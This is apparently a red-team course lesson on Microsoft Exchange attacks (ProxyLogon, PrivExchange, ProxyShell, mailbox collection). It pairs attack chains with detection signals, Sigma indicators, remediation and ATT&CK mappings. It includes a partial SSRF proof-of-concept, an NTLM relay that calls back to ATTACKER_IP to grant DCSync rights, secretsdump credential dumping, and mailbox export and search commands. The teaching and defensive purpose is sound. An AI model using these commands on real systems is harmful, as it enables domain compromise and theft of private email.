---
title: "Exchange and Email Attacks — ProxyLogon, PrivExchange, ProxyShell"
tags: [red-team, exchange, email, ProxyLogon, PrivExchange, ProxyShell, CVE-2021-26855,
  CVE-2021-34473, ATT&CK, T1190, T1114]
module: 08-RedTeam-02
day: 503
related_topics:
  - AD Attack Lab (Day 502)
  - Physical and Social Engineering (Day 504)
  - CVE Reproduction from Patch Diff (Day 457)
  - Web Exploitation Fundamentals (Days 91–130)
---

# Day 503 — Exchange and Email Attacks

> "Exchange is the crown jewel that most AD environments hand to attackers on
> a platter. It has EWS, OWA, PowerShell remoting, and by default, it has
> WriteDACL on the domain root. One Exchange server compromise equals domain
> compromise. Know the CVEs. Know PrivExchange. Know what the defender needs
> to do — because most of them have not done it."
>
> — Ghost

---

## Goals

Understand the Exchange attack surface and why Exchange servers are high-value
targets beyond email access.
Understand and reproduce the ProxyLogon attack chain (CVE-2021-26855 +
CVE-2021-27065).
Understand PrivExchange: the default Exchange privilege issue that leads to DA.
Understand ProxyShell (CVE-2021-34473 series) and its impact.
Map all techniques to ATT&CK and detection signals.

**Prerequisites:** Day 457 (CVE reproduction), Day 502 (AD attack paths),
web exploitation fundamentals (SSRF, authentication bypass).
**Time budget:** 5 hours.

---

## Part 1 — Exchange Attack Surface

Exchange Server exposes multiple interfaces that are each independently
attackable:

```
Attack surface:

OWA (Outlook Web Access) — HTTPS/443
  → Credential harvesting (phishing landing page)
  → Password spraying (lockout-sensitive — use low-and-slow)
  → Post-auth SSRF (ProxyLogon pivot)

EWS (Exchange Web Services) — HTTPS/443/EWS
  → Email collection (T1114.002)
  → OAB download for NTLM hash capture
  → PrivExchange (relay to LDAP via EWS subscription)

Autodiscover — HTTPS/443/autodiscover
  → NTLM hash capture (redirect Autodiscover to attacker server)
  → CVE-2021-26855 SSRF entry point (ProxyLogon)

Exchange Management Shell — PowerShell Remoting
  → Post-exploitation: add mailbox delegates, set forwarding rules
  → Role assignment (Organisation Management group = DA equivalent)

Exchange's AD permissions (default install):
  Exchange Windows Permissions group → WriteDACL on the domain root
  → This is PrivExchange: any compromised Exchange server account can
    grant itself DCSync rights
```

---

## Part 2 — ProxyLogon (CVE-2021-26855 + CVE-2021-27065)

ProxyLogon is a pre-authentication SSRF (CVE-2021-26855) chained with an
authenticated arbitrary file write (CVE-2021-27065) to achieve RCE.

### CVE-2021-26855 — SSRF via Autodiscover

```
The Exchange Client Access Service (CAS) proxies requests to the backend
Exchange server. The `X-BEResource` cookie is used to specify the backend
target — it is not properly validated.

Normal request:
  GET /autodiscover/autodiscover.xml
  Cookie: X-BEResource=localhost~1942935776~0

Malicious request:
  GET /autodiscover/autodiscover.xml HTTP/1.1
  Host: exchange.corp.local
  Cookie: X-BEResource=localhost/ecp/target.aspx?~3

The SSRF allows the attacker to make the Exchange server issue HTTP requests
to itself (on the backend, port 444) as SYSTEM — bypassing authentication.
```

```python
# ProxyLogon PoC — SSRF authentication bypass (CVE-2021-26855)
# This establishes a session cookie as any user, without credentials

import requests
import json

TARGET = "https://exchange.corp.local"
EMAIL = "administrator@corp.local"

# Step 1: Use SSRF to get a legit session cookie for the target user
payload = {
    "request": {
        "Header": {"X-BEResource": f"{TARGET}/ecp/DDI/DDIService.svc/..."},
        "Method": "POST",
        "RequestBody": json.dumps({"type": "ServicePlan", "email": EMAIL})
    }
}
# The SSRF causes Exchange to authenticate to its own backend as SYSTEM
# and returns a session cookie valid for the specified email account
```

### CVE-2021-27065 — Authenticated File Write (Post-SSRF)

```
With the session cookie obtained via SSRF, an attacker can write a web shell
to an arbitrary location via the Exchange Control Panel (ECP):

POST /ecp/DDI/DDIService.svc/GetObject HTTP/1.1
Cookie: <SSRF-obtained session cookie>

Payload: Sets OAB virtual directory ExternalURL to a web shell path
→ The ExternalURL is written to a file Exchange can serve
→ Result: ASPX web shell accessible at a predictable URL
```

### Complete Attack Flow

```
1. Identify Exchange server (Autodiscover, MX record, SSL cert CN)
2. Send SSRF request (CVE-2021-26855) to obtain session cookie as admin
3. Use session cookie to POST via ECP and write a web shell (CVE-2021-27065)
4. Access web shell → SYSTEM on the Exchange server
5. Exchange server is domain-joined → dump LSASS → credential access
6. Exchange Windows Permissions → PrivExchange → DCSync → domain dominance

Tools:
  https://github.com/hausec/ProxyLogon  (PoC, for lab use only)
  Metasploit module: exploit/windows/http/exchange_proxylogon_rce
```

**Detection:**

```
Network:
  Unusual requests to /autodiscover/ or /ecp/ with X-BEResource header
  from an external IP or an unusual internal IP
  IIS logs: POST requests to ECP DDI endpoints with unusual body length

Endpoint (on Exchange):
  New ASPX files created in C:\inetpub\wwwroot\aspnet_client\ or
  C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\
  Sysmon Event 11 (FileCreate): .aspx file in Exchange web directories

SIEM:
  Alert on new .aspx files in Exchange directories after CVE patch date
```

---

## Part 3 — PrivExchange

PrivExchange is not a CVE — it is a design issue in Exchange's default AD
permissions. It was documented by Dirk-jan Mollema in 2019 and has not been
automatically fixed by patches (requires manual remediation).

```
Default Exchange installation grants:
  "Exchange Windows Permissions" security group → WriteDACL on the domain root

This means:
  Any account that is a member of "Exchange Windows Permissions" can write
  a DACL entry on the domain root — including granting itself DCSync rights.

Exploitation path:
  1. Compromise any Exchange server (or any account in Exchange Windows Permissions)
  2. Use NtlmRelayX to relay the Exchange server's NTLM authentication to LDAP
  3. Add DCSync rights for an attacker-controlled account
  4. DCSync → all domain hashes

The relay works because Exchange servers have a feature where they can be
triggered to connect to an HTTP server (via EWS push subscriptions). The
NTLM authentication for that connection is then relayed to LDAP.
```

```bash
# PrivExchange exploitation with ntlmrelayx + privexchange.py

# Step 1: Set up NTLM relay to LDAP:
python3 ntlmrelayx.py -t ldap://DC.corp.local \
    --escalate-user ATTACKER_USER

# Step 2: Trigger Exchange to connect back:
python3 privexchange.py -ah ATTACKER_IP exchange.corp.local \
    -u any_domain_user -p Password123 -d corp.local
# Exchange server sends NTLM auth to ATTACKER_IP
# ntlmrelayx relays it to LDAP and adds DCSync rights to ATTACKER_USER

# Step 3: DCSync as ATTACKER_USER:
python3 secretsdump.py corp.local/ATTACKER_USER:Password123@DC.corp.local
```

**Detection:**

```
Event 5136: Directory Service Object Modified
  Object: domain root (DC=corp,DC=local)
  AttributeLDAPDisplayName: nTSecurityDescriptor (DACL modified)
  SubjectUserName: EXCHANGE_SERVER$ (machine account — unusual for ACL changes)

Alert: machine accounts modifying the domain root DACL is almost never
legitimate — Exchange is the known exception, and should be excluded only
after remediation.

Remediation:
  Remove WriteDACL from "Exchange Windows Permissions" on the domain root:
  https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-...
  (Exchange 2019 CU11+/2016 CU22+ supports split permissions model)
```

---

## Part 4 — ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207)

ProxyShell is a chain of three vulnerabilities patched in 2021 that also lead
to pre-authentication RCE on Exchange.

```
CVE-2021-34473: URL confusion → path normalisation bypass → auth bypass
  The Exchange CAS normalises paths in a way that allows an attacker to
  access backend endpoints that should require authentication.

CVE-2021-34523: Privilege escalation via Exchange PowerShell backend
  The normalised path allows accessing the PowerShell backend as SYSTEM.

CVE-2021-31207: Post-auth arbitrary file write
  Via Exchange PowerShell, write a web shell to an accessible directory.

Differences from ProxyLogon:
  ProxyLogon:  SSRF-based → specific to Autodiscover
  ProxyShell:  path confusion → broader surface, different code paths
  Both:        result in SYSTEM on Exchange → domain pivot
```

**Detection for ProxyShell:**

```
IIS logs: requests to /autodiscover/autodiscover.json with
  a path containing encoded characters (e.g., %252F, %u002f)
  that normalise to /ecp/ or PowerShell paths

Sigma rule indicator:
  cs-uri-stem contains '/autodiscover/autodiscover.json'
  AND cs-uri-query contains '@'   (email address in query)
  AND cs-uri-query contains 'PowerShell'
```

---

## Part 5 — Email Collection (T1114)

Once on Exchange (as SYSTEM or with admin rights), collect email data:

```powershell
# Export mailbox to PST (requires Exchange admin):
New-MailboxExportRequest -Mailbox administrator -FilePath \\FILESRV\share\admin.pst
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics

# Search-MailboxCommand (deprecated but present in older Exchange):
Search-Mailbox -Identity ceo@corp.local -SearchQuery "Subject:Acquisition" \
    -TargetMailbox attacker@corp.local -TargetFolder "Inbox" -LogOnly

# EWS direct query (from attacker machine with obtained credentials):
python3 ruler.py --email administrator@corp.local \
    --password 'Password123' --insecure display

# Impacket:
python3 exchanger.py corp.local/administrator:Password123@exchange.corp.local \
    nspi list-tables
```

---

## ATT&CK Mapping

| Technique | ATT&CK ID | Detection primary signal |
|---|---|---|
| ProxyLogon SSRF | T1190 | X-BEResource header in IIS logs |
| ProxyShell path confusion | T1190 | Encoded paths to autodiscover |
| Web shell write | T1505.003 | New .aspx in Exchange directories |
| PrivExchange relay | T1557.001 | NTLM relay; Event 5136 domain root DACL |
| Email collection | T1114.002 | New-MailboxExportRequest; EWS queries |

---

## Key Takeaways

1. Exchange is the most dangerous server in most AD environments because it
   combines a large external attack surface (OWA, Autodiscover, EWS) with
   deep AD permissions (WriteDACL on the domain root by default).
2. ProxyLogon chains SSRF (pre-auth) with a file write (post-auth). The SSRF
   bypasses authentication by making Exchange authenticate to its own backend
   as SYSTEM. Any endpoint behind that backend is reachable without credentials.
3. PrivExchange is still present in many environments years after disclosure.
   It is not fixed by patches — it requires deliberate administrative action
   (Exchange split permissions). Check for it on every AD engagement.
4. ProxyShell exploits a different code path than ProxyLogon and affects
   different patch levels. Patching ProxyLogon does not patch ProxyShell.
   Always check the Exchange version against all three CVE-2021-34xxx series.
5. Email collection is a critical intelligence phase. CEO emails, M&A documents,
   and legal correspondence are high-value targets. Monitor for
   `New-MailboxExportRequest` from non-admin sources.

---

## Exercises

1. In the lab Exchange VM (or a Docker-based Exchange simulator), identify the
   Exchange version and determine which of ProxyLogon, PrivExchange, and
   ProxyShell apply. Research the exact patch dates.
2. If the lab Exchange is unpatched for ProxyLogon: use the PoC to obtain a
   session cookie for the Administrator account. Do not proceed to RCE unless
   the lab is explicitly scoped for it. Document the SSRF response.
3. Check whether the lab AD has the PrivExchange misconfiguration: does the
   "Exchange Windows Permissions" group have WriteDACL on the domain root?
   Use `Get-ObjectAcl -Identity (Get-ADDomain).DistinguishedName`.
4. Write a Sigma rule for IIS logs that detects ProxyLogon-style X-BEResource
   cookie manipulation. Include the specific field names for IIS W3C log format.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q503.1, Q503.2 …).

---

## Navigation

← Previous: [Day 502 — AD Attack Lab](DAY-0502-AD-Attack-Lab.md)
→ Next: [Day 504 — Physical and Social Engineering](DAY-0504-Physical-and-Social-Engineering.md)
